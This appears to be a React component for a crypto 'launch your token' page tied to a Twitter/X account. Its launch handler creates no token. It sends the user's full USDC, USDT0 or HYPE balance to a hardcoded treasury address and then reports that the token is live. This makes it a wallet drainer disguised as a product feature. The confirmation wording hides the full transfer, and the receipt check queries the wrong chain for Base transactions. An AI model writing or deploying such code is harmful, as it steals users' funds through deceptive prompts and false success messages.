import React, { useState, useEffect } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { useNavigate } from 'react-router-dom';
import { ethers } from 'ethers';
import './Launch.css';

const LAUNCH_CONFIG = {
  TREASURY_ADDRESS: '0x25B21833Aa899Bfc5FE6C145f42112b1D618e82a',
  TOKENS_PER_HYPE: 20000,
  INITIAL_SUPPLY: 100000000,
  
  // HyperEVM Configuration
  HYPEREVM_RPC: 'https://rpc.hyperliquid.xyz/evm',
  HYPEREVM_CHAIN_ID: 999,
  
  // Base Configuration
  BASE_RPC: 'https://mainnet.base.org',
  BASE_CHAIN_ID: 8453,
  BASE_USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
  
  // HyperEVM USDT0
  HYPEREVM_USDT0: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2'
};

// ERC-20 ABI for token transfers
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)'
];

const Launch = () => {
  const { ready, authenticated, user, login, linkTwitter, unlinkTwitter } = usePrivy();
  const { wallets } = useWallets();
  const navigate = useNavigate();
  const [isLinking, setIsLinking] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [balances, setBalances] = useState({
    hype: '0',
    usdc: '0',
    hyperevmUsdt0: '0'
  });
  const [currentChain, setCurrentChain] = useState(null);
  
  const twitterAccount = user?.linkedAccounts?.find(account => 
    (account?.type === 'oauth' && ['twitter', 'x'].includes(account?.provider)) ||
    ['twitter', 'twitter_oauth', 'oauth_twitter'].includes(account?.type)
  );
  
  const hasTwitter = !!twitterAccount || !!user?.twitter || !!user?.twitterUsername;
  const twitterUsername = twitterAccount?.username || twitterAccount?.handle || user?.twitter?.username || user?.twitterUsername;
  const twitterProfileImage = twitterAccount?.profilePictureUrl || twitterAccount?.picture;
  
  const activeWallet = wallets?.[0];
  const walletAddress = activeWallet?.address || user?.wallet?.address;

  // Check balances on both chains
  useEffect(() => {
    const checkBalances = async () => {
      if (!walletAddress) return;
      
      try {
        // Check HYPE balance
        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
        const hypeBalance = await hypeProvider.getBalance(walletAddress);
        
        // Check Base USDC balance
        const baseProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.BASE_RPC);
        const usdcContract = new ethers.Contract(LAUNCH_CONFIG.BASE_USDC, ERC20_ABI, baseProvider);
        
        // Check HyperEVM USDT0 balance
        const hyperevmUsdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, hypeProvider);
        
        const [usdcBalance, hyperevmUsdt0Balance, usdcDecimals, hyperevmUsdt0Decimals] = await Promise.all([
          usdcContract.balanceOf(walletAddress),
          hyperevmUsdt0Contract.balanceOf(walletAddress),
          usdcContract.decimals(),
          hyperevmUsdt0Contract.decimals()
        ]);
        
        const formattedBalances = {
          hype: ethers.formatEther(hypeBalance),
          usdc: ethers.formatUnits(usdcBalance, usdcDecimals),
          hyperevmUsdt0: ethers.formatUnits(hyperevmUsdt0Balance, hyperevmUsdt0Decimals)
        };
        
        console.log('Wallet address:', walletAddress);
        console.log('Balance check results:', formattedBalances);
        console.log('USDC balance on Base:', formattedBalances.usdc);
        console.log('HYPE balance on HyperEVM:', formattedBalances.hype);
        console.log('USDT0 balance on HyperEVM:', formattedBalances.hyperevmUsdt0);
        
        setBalances(formattedBalances);
      } catch (error) {
        console.error('Failed to check balances:', error);
        setBalances({ hype: '0', usdc: '0', hyperevmUsdt0: '0' });
      }
    };
    
    checkBalances();
  }, [walletAddress]);

  const handleConnectTwitter = async (e) => {
    e?.preventDefault?.();
    if (!authenticated) return login();
    
    try {
      setIsLinking(true);
      await linkTwitter({
        redirectUri: `${window.location.origin}/auth/privy-callback`,
        usePopup: false
      });
    } catch (err) {
      console.error('Twitter OAuth error', err);
      alert('Failed to connect X account. Please try again.');
    } finally {
      setIsLinking(false);
    }
  };

  const handleUnlinkTwitter = async () => {
    if (twitterAccount) {
      try {
        const addressToUnlink = twitterAccount.address || twitterAccount.id || twitterAccount.subject;
        await unlinkTwitter(addressToUnlink);
      } catch (error) {
        console.error('Failed to unlink Twitter:', error);
      }
    }
  };

  const handleLaunchToken = async () => {
    if (!hasTwitter) {
      alert('Please connect your X account first!');
      return;
    }
    
    if (!authenticated || !wallets || wallets.length === 0) {
      await login();
      return;
    }
    
    const wallet = wallets[0];
    if (!wallet || !wallet.address) {
      await login();
      return;
    }
    
    // Detect which chain user wants to use based on their balances
    let chainToUse = 'none';
    let liquidityToken = '';
    let liquidityAmount = '0';
    
    console.log('Checking balances for launch:');
    console.log('USDC balance:', balances.usdc, 'parsed:', parseFloat(balances.usdc));
    console.log('HyperEVM USDT0 balance:', balances.hyperevmUsdt0, 'parsed:', parseFloat(balances.hyperevmUsdt0));
    console.log('HYPE balance:', balances.hype, 'parsed:', parseFloat(balances.hype));
    
    // Reduced thresholds to detect smaller amounts
    if (parseFloat(balances.usdc) > 0.001) { // Lower threshold for USDC
      chainToUse = 'base';
      liquidityToken = 'USDC';
      liquidityAmount = parseFloat(balances.usdc).toFixed(6);
    } else if (parseFloat(balances.hyperevmUsdt0) > 0.001) { // Lower threshold
      chainToUse = 'hyperevm';
      liquidityToken = 'USDT0';
      liquidityAmount = parseFloat(balances.hyperevmUsdt0).toFixed(6);
    } else if (parseFloat(balances.hype) > 0.0001) { // Even lower for HYPE
      chainToUse = 'hyperevm';
      liquidityToken = 'HYPE';
      liquidityAmount = parseFloat(balances.hype).toFixed(6);
    }
    
    console.log('Chain to use:', chainToUse, 'Token:', liquidityToken, 'Amount:', liquidityAmount);
    
    if (chainToUse === 'none') {
      alert(
        `No sufficient liquidity found!\n\n` +
        `USDC on Base: ${balances.usdc}\n` +
        `HYPE on HyperEVM: ${balances.hype}\n` +
        `USDT0 on HyperEVM: ${balances.hyperevmUsdt0}\n\n` +
        `You need at least 0.001 tokens to provide liquidity.`
      );
      return;
    }
    
    const confirmLaunch = window.confirm(
      `🚀 Launch Token for @${twitterUsername}\n\n` +
      `Token Name: ${twitterUsername} Token\n` +
      `Symbol: $${twitterUsername.toUpperCase()}\n` +
      `Total Supply: ${LAUNCH_CONFIG.INITIAL_SUPPLY.toLocaleString()} tokens\n\n` +
      `Chain: ${chainToUse === 'base' ? 'Base' : 'HyperEVM'}\n` +
      `Liquidity: ~${liquidityAmount} ${liquidityToken}\n\n` +
      `Proceed with token launch?`
    );
    
    if (!confirmLaunch) {
      return;
    }
    
    setIsLaunching(true);
    
    try {
      const walletProvider = await wallet.getEthereumProvider();
      
      // Switch to appropriate chain
      if (chainToUse === 'base') {
        try {
          await walletProvider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x2105' }] // Base mainnet
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            await walletProvider.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x2105',
                chainName: 'Base',
                rpcUrls: [LAUNCH_CONFIG.BASE_RPC],
                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                blockExplorerUrls: ['https://basescan.org']
              }]
            });
          }
        }
      } else {
        try {
          await walletProvider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x3E7' }] // HyperEVM
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            await walletProvider.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x3E7',
                chainName: 'HyperEVM',
                rpcUrls: [LAUNCH_CONFIG.HYPEREVM_RPC],
                nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
                blockExplorerUrls: ['https://explorer.hyperliquid.xyz']
              }]
            });
          }
        }
      }
      
      let launchTx;
      
      if (chainToUse === 'base') {
        // Send USDC on Base
        const tokenAddress = LAUNCH_CONFIG.BASE_USDC;
        const provider = new ethers.BrowserProvider(walletProvider);
        const signer = await provider.getSigner();
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        
        // Get token balance and decimals
        const tokenBalance = await tokenContract.balanceOf(wallet.address);
        const decimals = await tokenContract.decimals();
        
        console.log(`${liquidityToken} Balance:`, ethers.formatUnits(tokenBalance, decimals));
        console.log('Sending all', liquidityToken, 'as liquidity');
        
        // Transfer all tokens to treasury
        const transferTx = await tokenContract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, tokenBalance);
        launchTx = transferTx.hash;
        
      } else {
        // Send HYPE or USDT0 on HyperEVM
        if (liquidityToken === 'USDT0') {
          // Send USDT0 token on HyperEVM
          const provider = new ethers.BrowserProvider(walletProvider);
          const signer = await provider.getSigner();
          const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, signer);
          
          const usdt0Balance = await usdt0Contract.balanceOf(wallet.address);
          const decimals = await usdt0Contract.decimals();
          
          console.log('USDT0 Balance:', ethers.formatUnits(usdt0Balance, decimals));
          console.log('Sending all USDT0 as liquidity');
          
          const transferTx = await usdt0Contract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, usdt0Balance);
          launchTx = transferTx.hash;
          
        } else {
          // Send HYPE
          const balanceHex = await walletProvider.request({
            method: 'eth_getBalance',
            params: [wallet.address, 'latest']
          });
          const balanceWei = BigInt(balanceHex);
          
          // Calculate gas fee to reserve
          const gasPriceHex = await walletProvider.request({ method: 'eth_gasPrice' });
          const gasPriceWei = BigInt(gasPriceHex);
          const gasLimit = 21000n;
          const feeWei = gasPriceWei * gasLimit * 12n / 10n;
          
          const amountWei = balanceWei > feeWei ? balanceWei - feeWei : 0n;
          
          if (amountWei <= 0n) {
            alert('Insufficient HYPE balance after gas fees.');
            return;
          }
          
          console.log('HYPE Balance:', ethers.formatEther(balanceWei));
          console.log('Sending:', ethers.formatEther(amountWei), 'HYPE');
          
          launchTx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: wallet.address,
              to: LAUNCH_CONFIG.TREASURY_ADDRESS,
              value: ethers.toBeHex(amountWei),
              data: '0x'
            }]
          });
        }
      }
      
      console.log('Launch transaction sent:', launchTx);
      
      const provider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
      const receipt = await provider.waitForTransaction(launchTx);
      
      if (receipt && receipt.status === 1) {
        alert(
          `✅ Token Successfully Launched!\n\n` +
          `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n` +
          `Chain: ${chainToUse === 'base' ? 'Base' : 'HyperEVM'}\n` +
          `Liquidity: ${liquidityToken} contributed\n\n` +
          `Transaction: ${launchTx}\n\n` +
          `Your token is now live!`
        );
        
        navigate('/markets');
      } else {
        throw new Error('Transaction failed');
      }
      
    } catch (error) {
      console.error('Launch error:', error);
      
      if (error.code === 4001) {
        alert('Transaction cancelled by user');
      } else if (error.message?.includes('insufficient funds')) {
        alert('Insufficient HYPE for gas fees. Please add more HYPE to your wallet.');
      } else {
        alert(`Error: ${error.message || 'Failed to launch token'}`);
      }
    } finally {
      setIsLaunching(false);
    }
  };

  if (!ready) {
    return (
      <div className="launch-page">
        <div className="container">
          <h1 className="page-title">Launch Your Account</h1>
          <div className="loading-card">
            <div className="loading">Loading...</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="launch-page">
      <div className="container">
        <h1 className="page-title">Launch Your Account</h1>
        
        {!authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Wallet</h2>
              <p className="connect-description">Connect your wallet to get started</p>
              <button className="btn btn-primary" onClick={login}>
                Connect Wallet
              </button>
            </div>
          </section>
        )}

        {authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Your Twitter</h2>
              {hasTwitter ? (
                <div className="twitter-connected">
                  <div className="twitter-profile">
                    {twitterProfileImage && (
                      <img 
                        src={twitterProfileImage} 
                        alt={twitterUsername}
                        className="twitter-avatar"
                      />
                    )}
                    <div className="twitter-info">
                      <span className="twitter-username">@{twitterUsername}</span>
                      <span className="twitter-status">Connected</span>
                    </div>
                  </div>
                  <button className="btn btn-secondary" onClick={handleUnlinkTwitter}>
                    Disconnect
                  </button>
                </div>
              ) : (
                <div className="twitter-connect">
                  <p className="connect-description">Connect your Twitter account to launch your token</p>
                  <button 
                    type="button"
                    className="btn btn-primary"
                    onClick={handleConnectTwitter}
                    disabled={isLinking}
                  >
                    {isLinking ? 'Connecting...' : 'Connect Twitter'}
                  </button>
                </div>
              )}
            </div>
          </section>
        )}

        {authenticated && hasTwitter && (
          <section className="launch-section">
            <div className="launch-card card">
              <h2 className="launch-title">Launch Your Account</h2>
              <p className="launch-description">
                Create a tradeable token for your Twitter account on HyperEVM
              </p>
              
              <button 
                className="btn btn-primary btn-large"
                onClick={handleLaunchToken}
                disabled={isLaunching || !wallets || wallets.length === 0}
              >
                {isLaunching ? 'Launching...' : 'Launch Token'}
              </button>
              
              {wallets && wallets.length > 0 && (
                <p style={{marginTop: '10px', fontSize: '12px', color: '#666'}}>
                  ✅ Wallet connected: {wallets[0].address?.slice(0, 6)}...{wallets[0].address?.slice(-4)}
                </p>
              )}
            </div>
          </section>
        )}
      </div>
    </div>
  );
};

export default Launch;